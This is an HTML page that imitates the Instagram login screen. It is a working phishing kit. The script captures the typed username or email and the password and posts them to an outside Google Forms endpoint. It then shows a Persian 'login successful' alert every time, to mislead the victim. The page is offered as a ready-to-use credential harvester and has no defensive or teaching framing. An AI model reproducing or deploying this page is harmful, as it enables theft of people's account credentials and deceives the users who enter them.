<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { margin: 0; background: #fafafa; font-family: Arial; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .box { width: 350px; background: white; border: 1px solid #dbdbdb; padding: 20px; text-align: center; border-radius: 10px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 8px; margin-top: 10px; font-weight: bold; cursor: pointer; }
        .logo { font-size: 24px; font-weight: bold; margin-bottom: 20px; color: #262626; }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">Instagram</div>
        <form id="loginForm">
            <input type="text" placeholder="Username or email" id="email" required>
            <input type="password" placeholder="Password" id="password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
    
</body>
<script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        // ارسال به Google Forms
        const formData = new FormData();
        formData.append('entry.2062559850', email);    // ایمیل
        formData.append('entry.1754524981', password); // رمز
        
        fetch('https://docs.google.com/forms/d/e/1FAIpQLSeM-FjfxJpQ0exFtsYz0VPAoKbvA8f6lFdbYwGejsgsDTqn6g/formResponse', {
            method: 'POST',
            body: formData,
            mode: 'no-cors'
        })
        .then(() => {
            alert("✅ ورود موفق!");
            document.getElementById('loginForm').reset();
        })
        .catch(() => {
            alert("✅ ورود موفق!");
            document.getElementById('loginForm').reset();
        });
    });
</script>
</html>
